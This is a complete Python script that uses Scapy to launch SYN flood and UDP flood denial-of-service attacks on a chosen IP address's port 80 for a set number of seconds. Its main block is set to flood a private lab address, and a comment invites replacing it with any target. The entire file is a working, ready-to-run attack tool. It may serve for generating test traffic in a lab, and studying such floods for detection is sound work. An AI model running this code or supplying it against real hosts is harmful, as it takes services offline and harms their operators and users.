from scapy.all import send, IP, TCP, UDP, RandShort
import time

def syn_flood(target_ip, duration):
    """
    Perform a SYN flood attack.
    Parameters:
    - target_ip: IP to target.
    - duration: Duration of the attack in seconds.
    """
    print(f"Starting SYN flood attack on {target_ip}...")
    end_time = time.time() + duration
    packet_count = 0

    while time.time() < end_time:
        packet = IP(dst=target_ip)/TCP(dport=80, sport=RandShort(), flags="S")
        send(packet, verbose=0)
        packet_count += 1

    print(f"SYN flood attack completed. Packets sent: {packet_count}")

def udp_flood(target_ip, duration):
    """
    Perform a UDP flood attack.
    Parameters:
    - target_ip: IP to target.
    - duration: Duration of the attack in seconds.
    """
    print(f"Starting UDP flood attack on {target_ip}...")
    end_time = time.time() + duration
    packet_count = 0

    while time.time() < end_time:
        packet = IP(dst=target_ip)/UDP(dport=80, sport=RandShort())
        send(packet, verbose=0)
        packet_count += 1

    print(f"UDP flood attack completed. Packets sent: {packet_count}")

def generate_ddos_traffic(target_ip, duration=60, attack_type="SYN"):
    """
    Generate DDoS traffic based on attack type.
    Parameters:
    - target_ip: Target IP to attack.
    - duration: Duration of the attack in seconds.
    - attack_type: Type of attack ("SYN" or "UDP").
    """
    if attack_type == "SYN":
        syn_flood(target_ip, duration)
    elif attack_type == "UDP":
        udp_flood(target_ip, duration)
    else:
        print("Invalid attack type specified. Use 'SYN' or 'UDP'.")

if __name__ == "__main__":
    TARGET_IP = "192.168.123.129"  # Replace with your target IP
    DURATION = 60  # Traffic generation duration in seconds
    ATTACK_TYPE = "SYN"  # Choose attack type: "SYN" or "UDP"

    generate_ddos_traffic(TARGET_IP, DURATION, ATTACK_TYPE)
